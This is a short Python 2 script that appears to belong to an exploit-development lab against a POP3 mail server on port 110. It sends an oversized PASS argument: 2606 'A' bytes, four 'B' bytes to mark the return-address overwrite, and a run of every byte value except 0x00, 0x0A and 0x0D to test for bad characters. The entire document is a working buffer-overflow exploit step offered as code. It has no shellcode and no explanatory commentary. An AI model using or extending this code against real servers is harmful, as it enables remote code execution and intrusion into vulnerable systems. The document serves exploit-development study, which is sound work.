#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Variable containing badchars
badchar_test = ""
badchars = [0x00,0x0A,0x0D]

for i in range (0x00, 0xFF+1):
    if i not in badchars:
        badchar_test += chr(i)

buff = "A" * 2606 + "B" * 4 + badchar_test 

try:
    print "\nSending buffer..."
    #Connect to Windows machine
    s.connect(('10.0.2.15', 110))
    print "Connected"
    data = s.recv(1024)
    print str(data)
    s.send('USER username' + '\r\n')
    data = s.recv(1024)
    print str(data)
    s.send('PASS ' + buff + '\r\n')
    print "\nDone!"
	
except:
    print "Could not connect" 
